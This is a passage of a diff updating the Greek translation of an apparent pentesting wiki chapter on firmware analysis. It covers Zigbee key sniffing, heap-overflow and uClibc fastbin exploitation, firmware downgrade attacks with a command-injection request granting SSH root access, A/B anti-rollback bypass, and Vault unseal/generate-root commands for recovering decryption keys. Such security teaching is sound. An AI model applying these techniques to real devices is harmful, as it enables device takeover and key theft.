+Το runtime analysis περιλαμβάνει την αλληλεπίδραση με μια process ή ένα binary στο operating environment του, χρησιμοποιώντας εργαλεία όπως τα gdb-multiarch, Frida και Ghidra για τον ορισμό breakpoints και τον εντοπισμό vulnerabilities μέσω fuzzing και άλλων τεχνικών.
 
-Για embedded targets χωρίς full debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και συνδεθείτε remotely:
+Για embedded targets χωρίς full debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και κάντε remote attach:
 ```bash
 # On device
 gdbserver :1234 /usr/bin/targetd
@@ -308,99 +309,99 @@ gdbserver :1234 /usr/bin/targetd
 gdb-multiarch /path/to/targetd
 target remote <device-ip>:1234
 ```
-### Zigbee / radio-co-processor message mapping
+### Αντιστοίχιση μηνυμάτων Zigbee / radio co-processor
 
-Στα IoT hubs το RF stack συχνά χωρίζεται μεταξύ ενός **radio MCU** και ενός Linux userland process. Ένα χρήσιμο workflow είναι να χαρτογραφήσεις τη διαδρομή:
+Στα IoT hubs, το RF stack συχνά διαχωρίζεται μεταξύ ενός **radio MCU** και μιας διεργασίας Linux userland. Μια χρήσιμη διαδικασία είναι η χαρτογράφηση της διαδρομής:
 
 1. **RF frame** στον αέρα
 2. **controller-side parser** στο radio MCU
-3. **serial/UART text or TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
-4. **application dispatcher** στο main daemon
+3. **serial/UART text ή TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
+4. **application dispatcher** στον κύριο daemon
 5. **protocol-specific handler / state machine**
 
-Αυτή η αρχιτεκτονική δημιουργεί δύο reversing targets αντί για ένα. Αν ο controller μετατρέπει binary radio frames σε ένα textual protocol όπως `Group,Command,arg1,arg2,...`, ανακάλυψε:
+Αυτή η αρχιτεκτονική δημιουργεί δύο reversing targets αντί για ένα. Αν ο controller μετατρέπει τα binary radio frames σε ένα textual protocol όπως `Group,Command,arg1,arg2,...`, εντόπισε:
 
 - Τα **message groups** και τους dispatch tables
-- Ποια messages μπορούν να έρθουν από το **network** versus τον ίδιο τον controller
+- Ποια messages μπορούν να προέρχονται από το **network** και ποια από τον ίδιο τον controller
 - Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα Zigbee `manufacturer_code` και custom `cluster_command`)
-- Ποιοι handlers είναι reachable μόνο κατά τη διάρκεια **commissioning**, discovery, ή firmware/model download phases
+- Ποιοι handlers είναι προσβάσιμοι μόνο κατά τα στάδια **commissioning**, discovery ή firmware/model download
 
-Συγκεκριμένα για Zigbee, κατέγραψε pairing traffic και έλεγξε αν ο στόχος εξακολουθεί να βασίζεται στο default **Link Key** `ZigBeeAlliance09`. Αν ναι, το sniffing του commissioning traffic μπορεί να αποκαλύψει το **Network Key**. Τα Zigbee 3.0 install codes μειώνουν αυτή την έκθεση, οπότε σημείωσε αν η συσκευή που δοκιμάζεται τα επιβάλλει πραγματικά.
+Ειδικά για το Zigbee, κατέγραψε την κίνηση pairing και έλεγξε αν ο στόχος εξακολουθεί να χρησιμοποιεί το προεπιλεγμένο **Link Key** `ZigBeeAlliance09`. Αν ναι, το sniffing της κίνησης commissioning μπορεί να αποκαλύψει το **Network Key**. Τα install codes του Zigbee 3.0 μειώνουν αυτή την έκθεση, επομένως σημείωσε αν η συσκευή που δοκιμάστηκε τα επιβάλλει πράγματι.
 
-### Manufacturer-specific protocol handlers and FSM-gated reachability
+### Manufacturer-specific protocol handlers και FSM-gated reachability
 
-Vendor-specific Zigbee/ZCL commands είναι συχνά καλύτερος στόχος από τα standardized clusters επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη validation.
+Οι vendor-specific εντολές Zigbee/ZCL είναι συχνά καλύτερος στόχος από τα standardized clusters, επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένο validation.
 
-Πρακτικό workflow:
+Πρακτική διαδικασία:
 
-- Reverse τον command dispatcher μέχρι να βρεις τον **vendor-only handler**.
-- Ανακάλυψε τους **FSM state**, **event**, **check**, **action**, και **next-state** tables.
-- Εντόπισε **transitional states** που auto-advance και retry/error branches που τελικά reset ή free attacker-controlled state.
-- Επιβεβαίωσε ποια νόμιμα protocol exchanges απαιτούνται για να βάλεις το daemon στην ευάλωτη κατάσταση αντί να υποθέτεις ότι ο buggy handler είναι πάντα reachable.
+- Κάνε reverse τον command dispatcher μέχρι να εντοπίσεις τον **vendor-only handler**.
+- Ανάκτησε τους πίνακες **FSM state**, **event**, **check**, **action** και **next-state**.
+- Εντόπισε τα **transitional states** που προχωρούν αυτόματα και τα retry/error branches που τελικά κάνουν reset ή free attacker-controlled state.
+- Επιβεβαίωσε ποιες legitimate protocol exchanges απαιτούνται για να τοποθετηθεί ο daemon στην ευάλωτη κατάσταση, αντί να υποθέτεις ότι ο buggy handler είναι πάντα προσβάσιμος.
 
-Για timing-sensitive protocols, packet replay από Python framework μπορεί να είναι πολύ αργό. Μια πιο αξιόπιστη προσέγγιση είναι να emulate ένα νόμιμο device σε real hardware (για παράδειγμα ένα **nRF52840**) με vendor-grade stack ώστε να μπορείς να εκθέσεις τα σωστά **endpoints**, **attributes**, και commissioning timing.
+Για timing-sensitive protocols, το packet replay από ένα Python framework μπορεί να είναι υπερβολικά αργό. Μια πιο αξιόπιστη προσέγγιση είναι η εξομοίωση μιας legitimate συσκευής σε πραγματικό hardware (για παράδειγμα ένα **nRF52840**) με vendor-grade stack, ώστε να εκθέσεις τα σωστά **endpoints**, **attributes** και τον σωστό χρόνο commissioning.
 
-### Fragmented-download bug class in embedded daemons
+### Κατηγορία fragmented-download bugs σε embedded daemons
 
-Μια επαναλαμβανόμενη firmware bug class εμφανίζεται σε **fragmented blob/model/configuration downloads**:
+Μια επαναλαμβανόμενη κατηγορία firmware bugs εμφανίζεται σε **fragmented blob/model/configuration downloads**:
 
-1. Το **first fragment** (`offset == 0`) αποθηκεύει `ctx->total_size` και κάνει allocate `malloc(total_size)`.
-2. Τα επόμενα fragments μόνο validάρουν τα attacker-controlled **packet-local** fields όπως `packet_total_size >= offset + chunk_len`.
-3. Το copy χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο ως προς το **original allocated size**.
+1. Το **first fragment** (`offset == 0`) αποθηκεύει το `ctx->total_size` και κάνει allocate `malloc(total_size)`.
+2. Τα επόμενα fragments επικυρώνουν μόνο τα attacker-controlled **packet-local** fields, όπως `packet_total_size >= offset + chunk_len`.
+3. Το copy χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο σε σχέση με το **original allocated size**.
 
 Αυτό επιτρέπει σε έναν attacker να στείλει:
 
-- Ένα πρώτο valid fragment με ένα **μικρό** δηλωμένο total size ώστε να αναγκάσει ένα μικρό heap allocation.
-- Ένα μεταγενέστερο fragment με το **αναμενόμενο offset** αλλά μεγαλύτερο `chunk_len`.
-- Ένα forged packet-local size που ικανοποιεί τους νέους ελέγχους ενώ εξακολουθεί να overflow-άρει το αρχικά allocated buffer.
+- Ένα πρώτο valid fragment με **small** δηλωμένο total size, ώστε να προκαλέσει μικρό heap allocation.
+- Ένα μεταγενέστερο fragment με το **expected offset**, αλλά μεγαλύτερο `chunk_len`.
+- Ένα forged packet-local size που ικανοποιεί τους νέους ελέγχους, ενώ εξακολουθεί να κάνει overflow στο buffer που αρχικά έγινε allocate.
 
-Όταν το vulnerable path βρίσκεται πίσω από commissioning logic, η exploitation πρέπει να περιλαμβάνει αρκετό **device emulation** ώστε να οδηγήσει τον στόχο στην αναμενόμενη model-download ή blob-download κατάσταση πριν σταλούν τα malformed fragments.
+Όταν το vulnerable path βρίσκεται πίσω από commissioning logic, η exploitation πρέπει να περιλαμβάνει αρκετό **device emulation**, ώστε να οδηγήσει τον στόχο στην αναμενόμενη κατάσταση model-download ή blob-download πριν από την αποστολή των malformed fragments.
 
 ### Protocol-driven `free()` triggers
 
-Σε embedded daemons, ο πιο εύκολος τρόπος να ενεργοποιήσεις heap metadata exploitation δεν είναι συχνά το "περίμενε για cleanup" αλλά το **force το protocol's own error handling**:
+Σε embedded daemons, ο ευκολότερος τρόπος για να προκληθεί heap metadata exploitation συχνά δεν είναι το «wait for cleanup», αλλά η **force** ενεργοποίηση του error handling του ίδιου του protocol:
 
-- Στείλε malformed follow-up fragments για να σπρώξεις το FSM σε **retry** ή **error** states.
-- Ξεπέρασε το retry threshold ώστε το daemon να **resets context** και να free-άρει το corrupted buffer.
-- Χρησιμοποίησε αυτό το προβλέψιμο `free()` για να ενεργοποιήσεις allocator-side primitives πριν το process crash-άρει για άσχετους λόγους.
+- Στείλε malformed follow-up fragments για να οδηγήσεις το FSM σε **retry** ή **error** states.
+- Ξεπέρασε το retry threshold, ώστε ο daemon να κάνει **reset context** και να απελευθερώσει το corrupted buffer.
+- Χρησιμοποίησε αυτό το προβλέψιμο `free()` για να ενεργοποιήσεις allocator-side primitives πριν το process καταρρεύσει για άσχετους λόγους.
 
-Αυτό είναι ιδιαίτερα χρήσιμο εναντίον **musl/uClibc/dlmalloc-like** allocators σε embedded Linux, όπου το να corruptάρεις chunk metadata μπορεί να μετατρέψει το unlink/unbin logic σε write primitive. Ένα σταθερό pattern είναι να corruptάρεις ένα **size field** για να ανακατευθύνεις το allocator traversal σε **fake chunks staged inside the overflowed buffer**, αντί να καταστρέψεις αμέσως πραγματικά bin pointers και να crash-άρει το process.
+Αυτό είναι ιδιαίτερα χρήσιμο απέναντι σε **musl/uClibc/dlmalloc-like** allocators σε embedded Linux, όπου η αλλοίωση chunk metadata μπορεί να μετατρέψει τη λογική unlink/unbin σε write primitive. Ένα σταθερό pattern είναι η αλλοίωση ενός **size field** για ανακατεύθυνση του allocator traversal προς **fake chunks** που έχουν τοποθετηθεί μέσα στο overflowed buffer, αντί για άμεση καταστροφή πραγματικών bin pointers και crash του process.
 
-## Binary Exploitation and Proof-of-Concept
+## Binary Exploitation και Proof-of-Concept
 
-Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της target architecture και προγραμματισμό σε χαμηλότερου επιπέδου languages. Τα binary runtime protections σε embedded systems είναι σπάνια, αλλά όταν υπάρχουν, τεχνικές όπως Return Oriented Programming (ROP) μπορεί να είναι απαραίτητες.
+Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της αρχιτεκτονικής του στόχου και προγραμματισμό σε lower-level languages. Τα binary runtime protections σε embedded systems είναι σπάνια, αλλά όταν υπάρχουν, μπορεί να απαιτούνται τεχνικές όπως το Return Oriented Programming (ROP).
 
 ### uClibc fastbin exploitation notes (embedded Linux)
 
-- **Fastbins + consolidation:** Η uClibc χρησιμοποιεί fastbins παρόμοια με τη glibc. Μια μεταγενέστερη μεγάλη allocation μπορεί να ενεργοποιήσει `__malloc_consolidate()`, οπότε οποιοδήποτε fake chunk πρέπει να επιβιώσει τους checks (sane size, `fd = 0`, και τα γύρω chunks να φαίνονται ως "in use").
-- **Non-PIE binaries under ASLR:** αν το ASLR είναι ενεργό αλλά το main binary είναι **non-PIE**, οι in-binary `.data/.bss` addresses είναι σταθερές. Μπορείς να στοχεύσεις μια περιοχή που ήδη μοιάζει με valid heap chunk header ώστε να προσγειώσεις ένα fastbin allocation σε έναν **function pointer table**.
-- **Parser-stopping NUL:** όταν γίνεται parse JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing ενώ κρατά τα trailing attacker-controlled bytes για ένα stack pivot/ROP chain.
-- **Shellcode via `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()`, και `write()` μπορεί να τοποθετήσει executable shellcode σε ένα γνωστό mapping και να κάνει jump σε αυτό.
+- **Fastbins + consolidation:** Το uClibc χρησιμοποιεί fastbins παρόμοια με το glibc. Ένα μεταγενέστερο large allocation μπορεί να ενεργοποιήσει το `__malloc_consolidate()`, επομένως κάθε fake chunk πρέπει να επιβιώνει από τους ελέγχους (sane size, `fd = 0` και surrounding chunks που θεωρούνται "in use").
+- **Non-PIE binaries under ASLR:** Αν το ASLR είναι ενεργοποιημένο αλλά το κύριο binary είναι **non-PIE**, οι διευθύνσεις του in-binary `.data/.bss` είναι σταθερές. Μπορείς να στοχεύσεις μια περιοχή που ήδη μοιάζει με έγκυρο heap chunk header, ώστε να προσγειώσεις ένα fastbin allocation σε έναν **function pointer table**.
+- **Parser-stopping NUL:** Όταν γίνεται parsing JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing, διατηρώντας παράλληλα τα trailing attacker-controlled bytes για stack pivot/ROP chain.
+- **Shellcode via `/proc/self/mem`:** Ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()` και `write()` μπορεί να τοποθετήσει executable shellcode σε ένα γνωστό mapping και να κάνει jump σε αυτό.
 
-## Prepared Operating Systems for Firmware Analysis
+## Prepared Operating Systems για Firmware Analysis
 
-Operating systems όπως τα [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν pre-configured environments για firmware security testing, εξοπλισμένα με τα απαραίτητα tools.
+Operating systems όπως το [AttifyOS](https://github.com/adi0x90/attifyos) και το [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν pre-configured environments για firmware security testing, εξοπλισμένα με τα απαραίτητα tools.
 
-## Prepared OSs to analyze Firmware
+## Prepared OSs για ανάλυση Firmware
 
-- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι ένα distro σχεδιασμένο για να σε βοηθά να κάνεις security assessment και penetration testing σε Internet of Things (IoT) devices. Σου εξοικονομεί πολύ χρόνο παρέχοντας ένα pre-configured environment με όλα τα απαραίτητα tools φορτωμένα.
-- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο σε Ubuntu 18.04 με προφορτωμένα firmware security testing tools.
+- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι ένα distro που προορίζεται να σε βοηθήσει να πραγματοποιείς security assessment και penetration testing σε Internet of Things (IoT) devices. Εξοικονομεί πολύ χρόνο, παρέχοντας ένα pre-configured environment με όλα τα απαραίτητα tools φορτωμένα.
+- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο στο Ubuntu 18.04, preloaded με firmware security testing tools.
 
-## Firmware Downgrade Attacks & Insecure Update Mechanisms
+## Firmware Downgrade Attacks και Insecure Update Mechanisms
 
-Ακόμα και όταν ένας vendor υλοποιεί cryptographic signature checks για firmware images, η **version rollback (downgrade) protection** συχνά παραλείπεται. Όταν ο boot- ή recovery-loader μόνο επαληθεύει τη signature με ένα embedded public key αλλά δεν συγκρίνει την *version* (ή έναν monotonic counter) του image που γίνεται flashed, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **older, vulnerable firmware that still bears a valid signature** και έτσι να επαναφέρει patched vulnerabilities.
+Ακόμη και όταν ένας vendor υλοποιεί cryptographic signature checks για firmware images, η **version rollback (downgrade) protection συχνά παραλείπεται**. Όταν ο boot- ή recovery-loader επαληθεύει μόνο την υπογραφή με embedded public key, αλλά δεν συγκρίνει το *version* (ή έναν monotonic counter) του image που γίνεται flash, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **παλαιότερο, vulnerable firmware που εξακολουθεί να έχει valid signature** και έτσι να επαναφέρει patched vulnerabilities.
 
-Typical attack workflow:
+Τυπικό attack workflow:
 
-1. **Obtain an older signed image**
-* Πάρε το από το vendor’s public download portal, CDN ή support site.
-* Extract it από companion mobile/desktop applications (π.χ. μέσα σε ένα Android APK στο `assets/firmware/`).
-* Retrieve it από third-party repositories όπως VirusTotal, Internet archives, forums, κ.λπ.
-2. **Upload or serve the image to the device** μέσω οποιουδήποτε exposed update channel:
-* Web UI, mobile-app API, USB, TFTP, MQTT, κ.λπ.
-* Πολλά consumer IoT devices εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα decode-άρουν server-side και ενεργοποιούν recovery/upgrade.
-3. Μετά το downgrade, εκμεταλλεύσου μια vulnerability που είχε patched στο νεότερο release (για παράδειγμα ένα command-injection filter που προστέθηκε αργότερα).
-4. Προαιρετικά flash-άρισε πάλι το πιο πρόσφατο image ή απενεργοποίησε τις updates για να αποφύγεις την ανίχνευση μόλις αποκτηθεί persistence.
+1. **Απόκτησε ένα παλαιότερο signed image**
+* Πάρε το από το public download portal, το CDN ή το support site του vendor.
+* Κάνε extract από companion mobile/desktop applications (π.χ. μέσα σε ένα Android APK, κάτω από `assets/firmware/`).
+* Ανάκτησέ το από third-party repositories όπως VirusTotal, Internet archives, forums κ.λπ.
+2. **Κάνε upload ή serve το image στη συσκευή** μέσω οποιουδήποτε exposed update channel:
+* Web UI, mobile-app API, USB, TFTP, MQTT κ.λπ.
+* Πολλές consumer IoT συσκευές εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα κάνουν decode server-side και ενεργοποιούν recovery/upgrade.
+3. Μετά το downgrade, κάνε exploit σε ένα vulnerability που είχε γίνει patch στη νεότερη release (για παράδειγμα ένα command-injection filter που προστέθηκε αργότερα).
+4. Προαιρετικά, κάνε flash ξανά το latest image ή απενεργοποίησε τα updates για να αποφύγεις τον εντοπισμό μετά την απόκτηση persistence.
 
 ### Example: Command Injection After Downgrade
 ```http
@@ -409,62 +410,62 @@ Host: 192.168.0.1
 Content-Type: application/octet-stream
 Content-Length: 0
 ```
-Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια shell command χωρίς sanitisation, επιτρέποντας injection αυθαίρετων commands (εδώ – enabling SSH key-based root access). Οι νεότερες εκδόσεις firmware εισήγαγαν ένα βασικό character filter, αλλά η απουσία downgrade protection καθιστά τη διόρθωση moot.
+Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια εντολή shell χωρίς sanitisation, επιτρέποντας την injection αυθαίρετων εντολών (εδώ – την ενεργοποίηση root access μέσω SSH key). Οι μεταγενέστερες εκδόσεις firmware εισήγαγαν ένα βασικό character filter, όμως η απουσία προστασίας από downgrade καθιστά τη διόρθωση αναποτελεσματική.
 
-### Extracting Firmware From Mobile Apps
+### Εξαγωγή Firmware Από Mobile Apps
 
-Πολλοί vendors πακετάρουν πλήρη firmware images μέσα στις companion mobile applications τους, ώστε η app να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi‑Fi. Αυτά τα packages συνήθως αποθηκεύονται unencrypted στο APK/APEX σε paths όπως `assets/fw/` ή `res/raw/`. Tools όπως `apktool`, `ghidra`, ή ακόμη και το plain `unzip` σάς επιτρέπουν να pull signed images χωρίς να αγγίξετε το φυσικό hardware.
+Πολλοί vendors ενσωματώνουν πλήρη firmware images στις companion mobile applications τους, ώστε η εφαρμογή να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi-Fi. Αυτά τα packages αποθηκεύονται συνήθως χωρίς encryption στο APK/APEX, σε paths όπως `assets/fw/` ή `res/raw/`. Εργαλεία όπως τα `apktool`, `ghidra` ή ακόμη και το απλό `unzip` επιτρέπουν την εξαγωγή signed images χωρίς πρόσβαση στο physical hardware.
 ```
 $ apktool d vendor-app.apk -o vendor-app
 $ ls vendor-app/assets/firmware
 firmware_v1.3.11.490_signed.bin
 ```
-### Παράκαμψη anti-rollback μόνο από updater σε σχέδια A/B slot
+### Παράκαμψη anti-rollback μόνο μέσω updater σε σχεδιάσεις A/B slots
 
-Ορισμένοι vendors υλοποιούν ένα anti-downgrade **ratchet**, αλλά μόνο μέσα στη λογική του *updater* (για παράδειγμα ένα UDS routine over CAN, μια recovery command, ή ένας userspace OTA agent). Αν το **bootloader** αργότερα ελέγχει μόνο το image signature/CRC και εμπιστεύεται τον partition table ή τα slot metadata, η rollback protection μπορεί ακόμα να παρακαμφθεί.
+Ορισμένοι vendors υλοποιούν πράγματι ένα anti-downgrade **ratchet**, αλλά μόνο μέσα στη λογική του *updater* (για παράδειγμα, μια UDS routine μέσω CAN, μια recovery command ή ένας userspace OTA agent). Αν ο **bootloader** ελέγχει αργότερα μόνο το image signature/CRC και εμπιστεύεται το partition table ή τα slot metadata, η προστασία από rollback μπορεί και πάλι να παρακαμφθεί.
 
-Τυπικό αδύναμο design:
+Τυπική αδύναμη σχεδίαση:
 
-- Τα firmware metadata περιέχουν τόσο έναν version descriptor όσο και ένα **security ratchet** / monotonic counter.
+- Τα firmware metadata περιέχουν τόσο έναν version descriptor όσο και έναν **security ratchet** / monotonic counter.
 - Ο updater συγκρίνει το image ratchet με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα signed images.
-- Το bootloader δεν κάνει parse αυτό το ratchet και ελέγχει μόνο header, CRC, και signature πριν κάνει boot το επιλεγμένο slot.
-- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά σε έναν partition table ή per-slot generation counter και δεν είναι **cryptographically bound** στο ακριβές firmware digest που επικυρώθηκε.
+- Ο bootloader **δεν** κάνει parse το ratchet και επαληθεύει μόνο header, CRC και signature πριν από το boot του επιλεγμένου slot.
+- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά σε partition table ή σε per-slot generation counter και **δεν είναι κρυπτογραφικά συνδεδεμένη** με το ακριβές firmware digest που επαληθεύτηκε.
 
-Αυτό δημιουργεί ένα **validate-one-image / boot-another-image** primitive σε dual-slot systems. Αν ο attacker μπορεί να κάνει το updater να σημειώσει το slot B ως το επόμενο boot target χρησιμοποιώντας ένα current signed image, και αργότερα μπορεί να overwrite το slot B πριν το reboot, το bootloader μπορεί να κάνει ακόμα boot το downgraded image επειδή εμπιστεύεται μόνο τα ήδη committed slot metadata.
+Αυτό δημιουργεί ένα **validate-one-image / boot-another-image** primitive σε dual-slot systems. Αν ο attacker μπορεί να κάνει τον updater να σημειώσει το slot B ως επόμενο boot target χρησιμοποιώντας ένα current signed image και μπορεί αργότερα να αντικαταστήσει το slot B πριν από το reboot, ο bootloader μπορεί και πάλι να κάνει boot το downgraded image, επειδή εμπιστεύεται μόνο τα ήδη committed slot metadata.
 
 Συνηθισμένο abuse pattern:
 
-1. Upload ένα **current signed** firmware στο passive slot και εκτέλεσε το κανονικό validation/switch routine ώστε το layout να σημειώσει αυτό το slot ως next active.
-2. **Μην κάνεις reboot ακόμα**. Μπες ξανά στο slot-preparation/erase routine στην ίδια session.
-3. Εκμεταλλεύσου stale boot-state ή stale slot-selection logic ώστε ο updater να σβήσει το **ίδιο physical slot** που μόλις promoted.
-4. Γράψε ένα **older but still signed** firmware σε αυτό το slot.
-5. Παράλειψε το validation routine που επιβάλλει το ratchet και κάνε reboot απευθείας.
-6. Το bootloader επιλέγει το promoted slot, ελέγχει μόνο signature/integrity, και κάνει boot το παλιό image.
+1. Κάνε upload ένα **current signed** firmware στο passive slot και εκτέλεσε την κανονική validation/switch routine, ώστε το layout να σημειώσει το slot ως next active.
+2. **Μην κάνεις reboot ακόμη**. Κάνε re-enter στη slot-preparation/erase routine μέσα στην ίδια session.
+3. Κάνε abuse του stale boot-state ή του stale slot-selection logic, ώστε ο updater να κάνει erase το **ίδιο physical slot** που μόλις προωθήθηκε.
+4. Γράψε ένα **παλαιότερο αλλά ακόμη signed** firmware σε αυτό το slot.
+5. Παράλειψε τη validation routine που επιβάλλει το ratchet και κάνε απευθείας reboot.
+6. Ο bootloader επιλέγει το promoted slot, επαληθεύει μόνο signature/integrity και κάνει boot το παλιό image.
 
-Τι να ψάχνεις όταν κάνεις reverse A/B update implementations:
+Πράγματα που πρέπει να αναζητάς κατά το reversing A/B update implementations:
 
-- Slot selection που προκύπτει από **boot-time flags** τα οποία δεν ανανεώνονται μετά από ένα επιτυχημένο switch.
-- Ένα `prepare_passive_slot()`-style routine που σβήνει ένα slot με βάση stale state αντί για το **current committed layout**.
-- Μια `part_write_layout()`-style function που απλώς αυξάνει έναν **generation counter** / active flag και δεν αποθηκεύει το validated image hash.
-- Ratchet checks υλοποιημένα σε userspace ή updater code, αλλά **όχι** σε ROM / bootloader / secure boot stages.
-- Erase ή recovery routines που αφήνουν το slot σημειωμένο ως bootable ακόμα και αφού το περιεχόμενό του διαγράφηκε και ξαναγράφηκε.
+- Slot selection που προκύπτει από **boot-time flags** τα οποία δεν ανανεώνονται μετά από επιτυχημένο switch.
+- Μια routine τύπου `prepare_passive_slot()` που κάνει erase σε ένα slot βάσει stale state αντί για το **τρέχον committed layout**.
+- Μια function τύπου `part_write_layout()` που απλώς αυξάνει έναν **generation counter** / active flag και δεν αποθηκεύει το validated image hash.
+- Ratchet checks που υλοποιούνται σε userspace ή updater code, αλλά **όχι** σε ROM / bootloader / secure boot stages.
+- Erase ή recovery routines που αφήνουν το slot σημειωμένο ως bootable ακόμη και αφού το περιεχόμενό του αφαιρεθεί και ξαναγραφτεί.
 
-### Checklist για Αξιολόγηση Update Logic
+### Checklist για την αξιολόγηση του Update Logic
 
-* Είναι επαρκώς προστατευμένο το transport/authentication του *update endpoint* (TLS + authentication);
-* Συγκρίνει η συσκευή **version numbers** ή έναν **monotonic anti-rollback counter** πριν το flashing;
-* Επικυρώνεται το image μέσα σε secure boot chain (π.χ. signatures ελέγχονται από ROM code);
-* Εφαρμόζει το **bootloader το ίδιο ratchet** με το updater, αντί να ελέγχει μόνο signature/CRC;
-* Είναι τα slot activation metadata **bound to** το validated firmware digest/version, ή μπορεί να τροποποιηθεί ένα slot μετά το promotion;
-* Αφού πετύχει ένα slot switch, αναγκάζεται η συσκευή να κάνει reboot ή παραμένουν reachable later update/erase routines στην ίδια session;
+* Είναι επαρκώς προστατευμένα το transport/authentication του *update endpoint* (TLS + authentication);
+* Συγκρίνει η συσκευή **version numbers** ή ένα **monotonic anti-rollback counter** πριν από το flashing;
+* Επαληθεύεται το image μέσα σε secure boot chain (π.χ. signatures που ελέγχονται από ROM code);
+* Επιβάλλει ο **bootloader το ίδιο ratchet** με τον updater, αντί να ελέγχει μόνο signature/CRC;
+* Είναι τα slot activation metadata **συνδεδεμένα με το validated firmware digest/version** ή μπορεί να τροποποιηθεί ένα slot μετά το promotion;
+* Μετά από επιτυχημένο slot switch, υποχρεώνεται η συσκευή να κάνει reboot ή παραμένουν προσβάσιμες μεταγενέστερες update/erase routines μέσα στην ίδια session;
 * Εκτελεί ο userland code επιπλέον sanity checks (π.χ. allowed partition map, model number);
-* Χρησιμοποιούν τα *partial* ή *backup* update flows την ίδια validation logic;
+* Επαναχρησιμοποιούν τα *partial* ή *backup* update flows την ίδια validation logic;
 
-> 💡  Αν κάποιο από τα παραπάνω λείπει, η platform είναι πιθανότατα vulnerable σε rollback attacks.
+> 💡  Αν λείπει οποιοδήποτε από τα παραπάνω, η platform είναι πιθανότατα ευάλωτη σε rollback attacks.
 
-## Vulnerable firmware για practice
+## Vulnerable firmware για εξάσκηση
 
-Για να εξασκηθείς στην ανακάλυψη vulnerabilities σε firmware, χρησιμοποίησε τα παρακάτω vulnerable firmware projects ως σημείο εκκίνησης.
+Για να εξασκηθείς στον εντοπισμό vulnerabilities σε firmware, χρησιμοποίησε τα παρακάτω vulnerable firmware projects ως αφετηρία.
 
 - OWASP IoTGoat
 - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
@@ -479,18 +480,58 @@ firmware_v1.3.11.490_signed.bin
 - Damn Vulnerable IoT Device (DVID)
 - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
 
-## Trainning and Cert
+## Ανάκτηση firmware decryption keys από embedded KMS/Vault state
+
+Όταν ένα update image συνδυάζει μικρά plaintext metadata με ένα μεγάλο high-entropy blob, κάνε container triage πριν επιχειρήσεις οτιδήποτε με brute force:
+
+- Κάνε dump των headers, offsets και line boundaries με `hexdump`, `xxd`, `strings -tx`, `base64 -d` και `binwalk -E`.
+- Το `Salted__` συνήθως σημαίνει format του OpenSSL `enc`: τα επόμενα 8 bytes είναι το salt και τα υπόλοιπα bytes είναι ciphertext.
+- Ένα Base64 field που αποκωδικοποιείται σε ακριβώς `256` bytes αποτελεί ισχυρή ένδειξη ότι πρόκειται για RSA-2048 ciphertext που περιβάλλει ένα random firmware password/session key.
+- Detached PGP material στο ίδιο file συχνά προστατεύει μόνο την authenticity· μην υποθέτεις ότι αποτελεί τον confidentiality mechanism.
+
+Αν το static key hunting (`grep`, `strings`, PEM/PGP searches) αποτύχει, κάνε reverse το **operational decrypt path** αντί να αναζητάς μόνο private keys:
+
+- Κάνε decompile το updater / management binary και εντόπισε ποιος διαβάζει το encrypted blob, ποιο helper/API το κάνει unwrap και ποιο logical key name ζητά.
+- Κάνε search στο extracted root filesystem για KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), καθώς και για unit files και init scripts.
+- Αντιμετώπισε plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ή local KMS auto-unseal scripts ως ισοδύναμα private-key material.
+
+Αν η appliance περιλαμβάνει το original Vault binary και το storage backend, η αναπαραγωγή αυτού του environment είναι συνήθως ευκολότερη από την επανυλοποίηση των Vault internals:
+```bash
+vault server -config=/tmp/vault.hcl
+vault operator unseal <share1>
+vault operator unseal <share2>
+vault operator unseal <share3>
+
+OTP=$(vault operator generate-root -generate-otp)
+INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
+NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
+vault operator generate-root -nonce="$NONCE" "<share1>"
+vault operator generate-root -nonce="$NONCE" "<share2>"
